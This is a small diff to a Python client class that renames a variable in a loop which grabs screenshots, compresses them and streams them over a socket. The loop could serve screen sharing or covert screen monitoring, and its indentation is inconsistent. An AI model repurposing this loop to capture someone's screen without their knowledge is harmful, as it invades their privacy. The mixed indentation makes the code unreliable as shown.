@@ -32,9 +32,9 @@ class client:
 		sock = self.create_socket()
 		while True:
 			try:
-				steam_buffer = io.BytesIO()
-			  ImageGrab.grab().save(steam_buffer,'PNG')
-			  screenshot = steam_buffer.getvalue()
+				stream_buffer = io.BytesIO()
+			  ImageGrab.grab().save(stream_buffer,'PNG')
+			  screenshot = stream_buffer.getvalue()
 			  # Compress screenshot
 			  screenshot = zlib.compress(screenshot)
 			  sock.sendall(screenshot)
